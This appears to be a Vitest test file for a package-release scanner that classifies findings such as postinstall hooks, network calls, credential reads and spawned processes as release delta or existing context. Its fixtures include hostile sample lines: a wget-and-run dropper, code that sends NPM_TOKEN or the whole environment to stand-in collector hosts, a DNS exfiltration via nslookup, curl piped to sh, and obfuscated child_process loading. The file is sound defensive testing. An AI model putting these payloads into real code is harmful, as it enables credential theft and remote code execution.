import { createHash } from "node:crypto";
import { describe, expect, test } from "vitest";
import {
  annotateFindingsWithDiffStatus,
  computeRisk,
  createPackageDiff,
  deterministicFindings,
  projectReleaseRuleFindings,
} from "../server/lib/review";
import { changedStagedLines } from "../server/lib/review/rules/context";
import { computeScanRiskBreakdown } from "../server/lib/review/risk";

describe("changed staged line numbers", () => {
  test.each([
    ["same\n", "same\n", []],
    ["first\nsecond\n", "first\nchanged\n", [2]],
    ["first\nremoved\nlast\n", "first\nlast\n", []],
    ["first", "first\nadded", [1, 2]],
  ])("maps staged-side additions and replacements", (previous, staged, expected) => {
    expect([...changedStagedLines(previous, staged)]).toEqual(expected);
  });
});

describe("review diff annotation", () => {
  test("adds best-effort line numbers and diff annotations to findings", () => {
    const before = [
      {
        path: "index.js",
        size: 20,
        sha256: "old",
        flags: [],
        textSample: "export const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "package.json",
        size: 120,
        sha256: "pkg",
        flags: [],
        textSample: `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node install.js"
  }
}`,
      },
      {
        path: "index.js",
        size: 80,
        sha256: "new",
        flags: [],
        textSample: "export const value = 1;\nfetch('/debug');\n",
      },
    ];
    const diff = createPackageDiff(before, staged);
    const findings = deterministicFindings(staged, diff);

    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "package.json",
        evidence: "postinstall: node install.js",
        line: 4,
      }),
    );
    expect(findings).toContainEqual(
      expect.objectContaining({
        file: "index.js",
        evidence: "new/changed modified file: network-capable code path",
        line: 2,
      }),
    );

    const annotated = annotateFindingsWithDiffStatus(findings, diff);
    expect(annotated.find((finding) => finding.file === "index.js")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
    expect(annotated.find((finding) => finding.file === "package.json")).toMatchObject({
      diffStatus: "added",
      releaseDelta: true,
    });

    // With no downloaded baseline every file reads as added, which would grade
    // the package's whole contents as this release's delta. Report the missing
    // comparison instead.
    const withoutBaseline = annotateFindingsWithDiffStatus(findings, diff, {
      baselineComparisonSkipped: true,
    });
    expect(withoutBaseline.every((finding) => finding.releaseDelta === false)).toBe(true);
    expect(withoutBaseline.every((finding) => finding.diffStatus === "unknown")).toBe(true);
  });

  test("keeps modified-file findings contextual when the finding line did not change", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "new",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          id: "existing-risk",
          severity: "medium",
          file: "src/server.ts",
          line: 1,
          evidence: "network-capable code path",
          reason: "existing network path",
        },
        {
          id: "changed-line",
          severity: "medium",
          file: "src/server.ts",
          line: 2,
          evidence: "changed value",
          reason: "changed release line",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );

    expect(annotated.find((finding) => finding.id === "existing-risk")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: false,
    });
    expect(annotated.find((finding) => finding.id === "changed-line")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("projects only release-scoped findings without persistence annotations", () => {
    const base = {
      severity: "high",
      file: "index.js",
      evidence: "network-capable code path",
      reason: "release code opens a network connection",
      ruleId: "code.network-access",
      ruleVersion: "1.0.0",
    };

    expect(
      projectReleaseRuleFindings([
        { ...base, diffStatus: "added", releaseDelta: true },
        { ...base, file: "existing.js", diffStatus: "unchanged", releaseDelta: false },
      ]),
    ).toEqual([base]);
  });

  test("classifies manifest-diff dependency findings as release delta regardless of line", () => {
    // These rules are derived from the previous-vs-staged manifest diff, so they
    // are release-scoped by construction; they must not fall through to the
    // line-diff heuristic where an unchanged duplicate key would misclassify
    // them as package context.
    const annotated = annotateFindingsWithDiffStatus(
      [
        { id: "added", severity: "medium", file: "package.json", ruleId: "dependency.added" },
        { id: "bump", severity: "low", file: "package.json", ruleId: "dependency.major-bump" },
      ],
      [{ path: "package.json", status: "modified" }],
      {},
    );

    expect(annotated.every((finding) => finding.releaseDelta)).toBe(true);
  });

  test("keeps modified-file findings release scoped when a later matching line changed", () => {
    const previous = [
      {
        path: "src/server.ts",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "fetch('/existing-risk');\nexport const value = 1;\n",
      },
    ];
    const staged = [
      {
        path: "src/server.ts",
        size: 90,
        sha256: "new",
        flags: [],
        textSample:
          "fetch('/existing-risk');\nexport const value = 1;\nfetch('https://example.invalid/new-risk');\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff);
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("uses Python annotation patterns for extensionless modified files", () => {
    const previous = [
      {
        path: "scripts/post_install",
        size: 100,
        sha256: "old",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 1\n",
      },
    ];
    const staged = [
      {
        path: "scripts/post_install",
        size: 160,
        sha256: "new",
        flags: [],
        textSample:
          "import urllib.request\nurllib.request.urlopen('https://example.invalid/existing')\nvalue = 2\nurllib.request.urlopen('https://example.invalid/new')\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const findings = deterministicFindings(staged, diff, null, { codePatternSet: "python" });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles: previous,
      stagedFiles: staged,
      codePatternSet: "python",
    });

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      file: "scripts/post_install",
      line: 1,
      diffStatus: "modified",
      releaseDelta: true,
    });
  });

  test("keeps PyPI adapter findings release scoped even when paths use artifact namespaces", () => {
    const diff = [
      {
        path: "wheel/py3-none-any/sitecustomize.py",
        status: "added",
        stagedSize: 7,
        stagedSha256: "hook",
        flags: [],
      },
    ];
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "dist/demo_package-1.2.0-py3-none-any.whl/sitecustomize.py",
          evidence: "sitecustomize.py runs automatically on interpreter startup",
          reason: "startup hook",
          ruleId: "pypi.startup-hook",
        },
      ],
      diff,
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unknown",
      releaseDelta: true,
    });
  });

  test("keeps VS Code adapter findings release scoped on an unchanged file with a baseline", () => {
    const unchangedFile = {
      path: "out/extension.js",
      size: 40,
      sha256: "same",
      textSample: "exports.activate = () => require('vm').runInThisContext(x);",
      flags: [],
    };
    const diff = [{ path: "out/extension.js", status: "unchanged" }];
    // A VSIX with a marketplace baseline whose flagged file did not change since
    // the last release. The finding is a property of the release, not a line
    // diff, so it must stay release-scoped instead of falling through to a
    // releaseDelta: false diff annotation that understates releaseRisk.
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "out/extension.js",
          line: 1,
          evidence: "activation loads a WebAssembly module on startup",
          reason: "startup wasm loader",
          ruleId: "vscode.startup-wasm-loader",
        },
      ],
      diff,
      {
        codePatternSet: "javascript",
        previousFiles: [unchangedFile],
        stagedFiles: [unchangedFile],
      },
    );

    expect(annotated[0]).toMatchObject({
      diffStatus: "unchanged",
      releaseDelta: true,
    });
  });
});

describe("baseline finding fingerprints", () => {
  test("keeps a line-less modified-file finding contextual when the baseline already fired the same rule", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "const { execSync } = require('child_process');\nexecSync('node -v');\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample:
          "const { execSync } = require('child_process');\nexecSync('node -v');\n// touched\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: false });
  });

  test("fails open to release delta when the baseline has no matching finding", () => {
    const previous = [
      {
        path: "lib/util.js",
        size: 60,
        sha256: "old",
        flags: [],
        textSample: "export const a = 1;\n",
      },
    ];
    const staged = [
      {
        path: "lib/util.js",
        size: 70,
        sha256: "new",
        flags: [],
        textSample: "export const a = 2;\n",
      },
    ];
    const diff = createPackageDiff(previous, staged);
    const annotated = annotateFindingsWithDiffStatus(
      [
        {
          severity: "high",
          file: "lib/util.js",
          evidence: "process or shell execution",
          reason: "package may execute arbitrary commands",
          ruleId: "code.process-execution",
        },
      ],
      diff,
      { previousFiles: previous, stagedFiles: staged },
    );
    expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
  });
});

describe("code.remote-shell release-delta classification", () => {
  const manifest = { name: "p", version: "1.0.1", main: "index.js" };

  test("a decoy shell token in an untouched line does not hide the added dropper", () => {
    // Regression: `patternsForFinding` had no case for `code.remote-shell`, so
    // the rule could only be release-delta when its recorded line happened to
    // be a changed line — and the recorded line is the *first* match in the
    // file. Any pre-existing `curl`/`wget`/`nc` token earlier in the file (a
    // comment, a usage string) pinned it to an unchanged line and dropped the
    // newly added dropper out of `releaseRisk`, which is what the workflow gate
    // reads. The gate then recommended approve.
    const previousFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "a",
        flags: [],
        textSample: JSON.stringify({ name: "p", version: "1.0.0", main: "index.js" }),
      },
      {
        path: "index.js",
        size: 60,
        sha256: "b",
        flags: [],
        textSample: "// see: curl https://example.invalid/docs\nconst a = 1;\n",
      },
    ];
    const stagedFiles = [
      {
        path: "package.json",
        size: 40,
        sha256: "c",
        flags: [],
        textSample: JSON.stringify(manifest),
      },
      {
        path: "index.js",
        size: 160,
        sha256: "d",
        flags: [],
        textSample:
          "// see: curl https://example.invalid/docs\nconst a = 1;\n" +
          'require("child_process").execSync("wget http://evil.invalid/p -O /tmp/p && /tmp/p");\n',
      },
    ];

    const diff = createPackageDiff(previousFiles, stagedFiles);
    const annotated = annotateFindingsWithDiffStatus(
      deterministicFindings(stagedFiles, diff, manifest),
      diff,
      { previousFiles, stagedFiles },
    );

    const remoteShell = annotated.find((finding) => finding.ruleId === "code.remote-shell");
    expect(remoteShell).toBeDefined();
    // The recorded line is still the decoy on line 1 — that is where the first
    // pattern match is — but the finding is release delta because the rule's
    // patterns also match the added line.
    expect(remoteShell.releaseDelta).toBe(true);
    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
  });
});

describe("release delta in minified and grown modules", () => {
  const AI_OFF = {
    status: "unavailable",
    risk: "low",
    releaseAssessment: "not_assessed",
    summary: "",
    findings: [],
    requiresManualReview: false,
    model: null,
    reviewerVersion: null,
  };
  // The digest must cover the whole text, or an edited file reads as unchanged.
  const file = (path, textSample) => ({
    path,
    size: textSample.length,
    sha256: createHash("sha256").update(textSample).digest("hex"),
    flags: [],
    textSample,
  });
  const release = (previous, staged) => {
    const previousFiles = Object.entries(previous).map(([path, text]) => file(path, text));
    const stagedFiles = Object.entries(staged).map(([path, text]) => file(path, text));
    const diff = createPackageDiff(previousFiles, stagedFiles);
    const findings = deterministicFindings(stagedFiles, diff, null, { previousFiles });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles,
      stagedFiles,
    });
    return { annotated, risk: computeScanRiskBreakdown(annotated, AI_OFF) };
  };
  // The version string sits far more than the match margin from any capability.
  const bundle = (version, tail = "") =>
    `function g(){return fetch("https://api.example.org/v1")};var e=process.env.SERVICE_KEY;var q=${"0".repeat(3000)};var v="${version}";${"1".repeat(3000)}${tail}\n`;

  test("a version-string edit in a minified bundle leaves its capabilities as package context", () => {
    const { annotated, risk } = release(
      { "dist/index.js": bundle("4.26.1") },
      { "dist/index.js": bundle("4.26.2") },
    );

    expect(annotated.find((finding) => finding.ruleId === "code.network-access")).toMatchObject({
      diffStatus: "modified",
      releaseDelta: false,
    });
    expect(annotated.filter((finding) => finding.releaseDelta)).toEqual([]);
    expect(risk.releaseRisk).toBe("low");
  });

  test("a payload appended to a minified bundle is on the release delta", () => {
    const payload =
      ';require("https").get("https://collector.example.invalid/?t="+process.env.NPM_TOKEN)';
    const { risk } = release(
      { "dist/index.js": bundle("1.0.0") },
      { "dist/index.js": bundle("1.0.0", payload) },
    );

    expect(risk.releaseRisk).toBe("high");
  });

  test("more spawns in a module that already spawns are an expanded capability", () => {
    const previous = "const { execSync } = require('child_process');\nexecSync('npm --version');\n";
    const staged = `${previous}execSync('pnpm --version');\nexecSync('yarn --version');\n`;
    const { annotated } = release({ "index.js": previous }, { "index.js": staged });

    expect(annotated.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      releaseDelta: true,
      releaseDeltaKind: "expanded",
    });
  });

  test.each([
    [
      "a host the baseline never named",
      "fetch('https://api.example.org/a');\n",
      "fetch('https://api.example.org/a');\nfetch('https://collector.example.invalid/b');\n",
      "code.network-access",
    ],
    [
      "a bare hostname in request options",
      "require('https').get('https://api.example.org/a');\n",
      "require('https').get('https://api.example.org/a');\nrequire('https').request({ hostname: 'collector.example.invalid' });\n",
      "code.network-access",
    ],
    [
      "a change that only matches once assembled, appended",
      "require('child_process').execSync('git status');\n",
      "require('child_process').execSync('git status');\nglobalThis['re' + 'quire'](['chi', 'ld_pro', 'cess'].join('')).execSync(cmd);\n",
      "code.process-execution",
    ],
    [
      "a change that only matches once assembled, prepended",
      "require('child_process').execSync('git status');\n",
      "globalThis['re' + 'quire'](['chi', 'ld_pro', 'cess'].join('')).execSync(cmd);\nrequire('child_process').execSync('git status');\n",
      "code.process-execution",
    ],
    [
      "one more eval site",
      "const add = new Function('a', 'return a + 1');\n",
      "const add = new Function('a', 'return a + 1');\nnew Function(fetched)();\n",
      "code.dynamic-evaluation",
    ],
    [
      "one more credential read",
      "const home = process.env.SERVICE_KEY;\n",
      "const home = process.env.SERVICE_KEY;\nconst token = process.env.NPM_TOKEN;\n",
      "code.credential-access",
    ],
  ])("keeps full scoring for %s", (_name, previous, staged, ruleId) => {
    const { annotated } = release({ "index.js": previous }, { "index.js": staged });
    const finding = annotated.find((candidate) => candidate.ruleId === ruleId);

    expect(finding).toMatchObject({ releaseDelta: true });
    expect(finding.releaseDeltaKind).toBeUndefined();
  });

  test("a payload split across two modules that each already had their half stays high", () => {
    const { risk } = release(
      {
        "lib/http.js":
          "module.exports = (u) => fetch('https://github.com/org/repo/releases/latest');\n",
        "lib/cli.js":
          "const { execFileSync } = require('child_process');\nexecFileSync('git', ['status']);\n",
      },
      {
        "lib/http.js":
          "module.exports = (u) => fetch('https://github.com/org/repo/releases/latest');\nfetch('https://github.com/org/repo/raw/x').then((r) => r.text()).then(save);\n",
        "lib/cli.js":
          "const { execFileSync } = require('child_process');\nexecFileSync('git', ['status']);\nexecFileSync(tmpPath);\n",
      },
    );

    expect(risk.releaseRisk).toBe("high");
  });

  test("a credential sent through a spawn's arguments stays high", () => {
    const previous =
      "const { execFileSync } = require('child_process');\nconst gh = process.env.GITHUB_TOKEN;\nexecFileSync('git', ['status']);\n";
    const staged = `${previous}execFileSync('nslookup', [Buffer.from(process.env.NPM_TOKEN).toString('hex') + '.x.example.invalid']);\n`;
    const { risk } = release({ "lib/release.js": previous }, { "lib/release.js": staged });

    expect(risk.releaseRisk).toBe("high");
  });
});

describe("renamed bundler chunks", () => {
  const AI_OFF = {
    status: "unavailable",
    risk: "low",
    releaseAssessment: "not_assessed",
    summary: "",
    findings: [],
    requiresManualReview: false,
    model: null,
    reviewerVersion: null,
  };
  const file = (path, textSample) => ({
    path,
    size: textSample.length,
    sha256: createHash("sha256").update(textSample).digest("hex"),
    flags: [],
    textSample,
  });
  const release = (previous, staged) => {
    const previousFiles = Object.entries(previous).map(([path, text]) => file(path, text));
    const stagedFiles = Object.entries(staged).map(([path, text]) => file(path, text));
    const diff = createPackageDiff(previousFiles, stagedFiles);
    const findings = deterministicFindings(stagedFiles, diff, null, { previousFiles });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles,
      stagedFiles,
    });
    return { diff, annotated, risk: computeScanRiskBreakdown(annotated, AI_OFF) };
  };
  // A CLI chunk that already spawns, fetches, reads the environment and
  // compiles code, padded with module body the way a real bundle is.
  const chunk = (version, splice = "") =>
    [
      "import { execFileSync } from 'node:child_process';",
      "const token = process.env.SERVICE_KEY;",
      "const compile = new Function('a', 'return a + 1');",
      "export function ping() { return fetch('https://api.example.org/health'); }",
      "export function gitVersion() { return execFileSync('git', ['--version']).toString(); }",
      ...Array.from(
        { length: 60 },
        (_, index) =>
          `export function formatRow${index}(row) { return [row.name, row.size].join(' | '); }`,
      ),
      `export const VERSION = '${version}';`,
      splice,
    ].join("\n");

  test("a chunk renamed under a new content hash is diffed against its predecessor", () => {
    const { diff, annotated, risk } = release(
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
      { "dist/chunk-64MTZBJ6.js": chunk("1.0.1") },
    );

    expect(diff.find((entry) => entry.path === "dist/chunk-64MTZBJ6.js")).toMatchObject({
      status: "added",
      renamedFrom: "dist/chunk-YQNCOY6V.js",
    });
    expect(annotated.length).toBeGreaterThan(0);
    for (const finding of annotated) {
      expect(finding).toMatchObject({ diffStatus: "added", releaseDelta: false });
    }
    expect(risk.releaseRisk).toBe("low");
  });

  test("rules grade a renamed chunk at modified-file severity", () => {
    const renamed = release(
      { "dist/cli.De07GUeT.js": chunk("1.0.0") },
      { "dist/cli.CGfpMDSb.js": chunk("1.0.1") },
    );
    const brandNew = release({}, { "dist/cli.CGfpMDSb.js": chunk("1.0.1") });
    const severity = ({ annotated }) =>
      annotated.find((finding) => finding.ruleId === "code.dynamic-evaluation")?.severity;

    expect(severity(renamed)).toBe("medium");
    expect(severity(brandNew)).toBe("high");
  });

  test("a payload spliced into a renamed chunk is on the release delta", () => {
    const payload =
      "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);";
    const { diff, annotated, risk } = release(
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
      { "dist/chunk-64MTZBJ6.js": chunk("1.0.1", payload) },
    );

    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBe(
      "dist/chunk-YQNCOY6V.js",
    );
    expect(annotated.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
      releaseDelta: true,
    });
    expect(risk.releaseRisk).toBe("high");
  });

  test("more spawns in a renamed chunk that already spawned are an expanded capability", () => {
    const { annotated } = release(
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
      {
        "dist/chunk-64MTZBJ6.js": chunk(
          "1.0.0",
          "export function npmVersion() { return execFileSync('npm', ['--version']).toString(); }",
        ),
      },
    );

    expect(annotated.find((finding) => finding.ruleId === "code.process-execution")).toMatchObject({
      diffStatus: "added",
      releaseDelta: true,
      releaseDeltaKind: "expanded",
    });
  });

  test("a capability the predecessor never had keeps full scoring in a renamed chunk", () => {
    const previous = chunk("1.0.0").replace(/.*execFileSync.*\n/g, "");
    const { diff, annotated } = release(
      { "dist/chunk-YQNCOY6V.js": previous },
      {
        "dist/chunk-64MTZBJ6.js": `${previous}\nimport('node:child_process').then((cp) => cp.execSync(next));`,
      },
    );
    const spawn = annotated.find((finding) => finding.ruleId === "code.process-execution");

    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBe(
      "dist/chunk-YQNCOY6V.js",
    );
    expect(spawn).toMatchObject({ releaseDelta: true });
    expect(spawn.releaseDeltaKind).toBeUndefined();
  });

  test("a payload chunk unrelated to the removed chunk keeps the added-file treatment", () => {
    // The decoy: a release that drops some chunk does not lend its history to
    // whatever new file lands in the same directory.
    const dropper = [
      "const { execSync } = require('child_process');",
      "const data = JSON.stringify(process.env);",
      "require('https').request({ hostname: 'collector.example.invalid', method: 'POST' }).end(data);",
      "execSync('curl -s https://collector.example.invalid/x | sh');",
    ].join("\n");
    const { diff, annotated, risk } = release(
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
      { "dist/chunk-64MTZBJ6.js": dropper },
    );

    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBeUndefined();
    expect(annotated.every((finding) => finding.releaseDelta)).toBe(true);
    expect(risk.releaseRisk).toBe("critical");
    expect(risk).toEqual(release({}, { "dist/chunk-64MTZBJ6.js": dropper }).risk);
  });

  test("a payload padded with the removed chunk's body pairs but still raises release risk", () => {
    const payload = [
      "const { execSync: run } = require('child_process');",
      "run('curl -s https://collector.example.invalid/x | sh');",
      "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);",
    ].join("\n");
    const { diff, risk } = release(
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
      { "dist/chunk-64MTZBJ6.js": chunk("1.0.0", payload) },
    );

    expect(diff.find((entry) => entry.status === "added")?.renamedFrom).toBe(
      "dist/chunk-YQNCOY6V.js",
    );
    expect(risk.releaseRisk).toBe("critical");
    // Pairing buys nothing over editing the predecessor in place.
    const inPlace = release(
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0") },
      { "dist/chunk-YQNCOY6V.js": chunk("1.0.0", payload) },
    );
    expect(risk.releaseRisk).toBe(inPlace.risk.releaseRisk);
  });

  test("a renamedFrom that does not name a removed file is ignored", () => {
    const previousFiles = [file("dist/shared.js", chunk("1.0.0"))];
    const stagedFiles = [
      file("dist/shared.js", chunk("1.0.0")),
      file("dist/chunk-64MTZBJ6.js", chunk("1.0.1")),
    ];
    const diff = createPackageDiff(previousFiles, stagedFiles).map((entry) =>
      entry.status === "added" ? { ...entry, renamedFrom: "dist/shared.js" } : entry,
    );
    const findings = deterministicFindings(stagedFiles, diff, null, { previousFiles });
    const annotated = annotateFindingsWithDiffStatus(findings, diff, {
      previousFiles,
      stagedFiles,
    });

    const added = annotated.filter((finding) => finding.file === "dist/chunk-64MTZBJ6.js");
    expect(added.length).toBeGreaterThan(0);
    for (const finding of added) expect(finding.releaseDelta).toBe(true);
  });

  test("a large renamed bundle is not a large new file", () => {
    const table = Array.from(
      { length: 40_000 },
      (_, index) => `export const row${index} = { id: ${index}, label: 'generated lookup row' };`,
    ).join("\n");
    const big = (version) => `${chunk(version)}\n${table}\n`;
    const largeNewFiles = ({ annotated }) =>
      annotated.filter((finding) => finding.ruleId === "diff.large-new-file");

    expect(
      largeNewFiles(
        release(
          { "dist/table-YQNCOY6V.js": big("1.0.0") },
          { "dist/table-64MTZBJ6.js": big("1.0.1") },
        ),
      ),
    ).toEqual([]);
    expect(largeNewFiles(release({}, { "dist/table-64MTZBJ6.js": big("1.0.1") }))).toHaveLength(1);
  });
});
